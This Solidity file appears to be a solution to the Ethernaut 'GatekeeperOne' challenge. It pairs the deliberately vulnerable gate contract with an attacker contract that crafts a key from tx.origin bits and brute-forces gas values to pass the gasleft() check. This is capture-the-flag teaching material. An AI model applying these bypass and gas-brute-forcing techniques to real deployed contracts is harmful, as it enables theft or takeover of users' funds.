// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperOneAttacker {
    function attack(address _gateKeeper) external {
        GatekeeperOne gateKeeper = GatekeeperOne(_gateKeeper);
        // needs to be conducted through a contract which is already done here

        // key = uint64(_gateKey);
        // gateKey that is passed in needs
        // uint32(key) == uint16(uint160(tx.origin));
        // uint32(key) == uint16(key);
        uint16 key16 = uint16(uint160(tx.origin));

        // uint32(key) != key;
        uint64 key64 = uint64(1 << 63) + uint64(key16);

        bytes8 key = bytes8(key64);
        // needs to take up gas so the modulo 8191 results in 0 so a multiple of 8191
        for (uint i = 0; i < 8191; i++) {
            try gateKeeper.enter{gas: 100000 + i}(key) {
                break;
            } catch {}
        }
    }
}
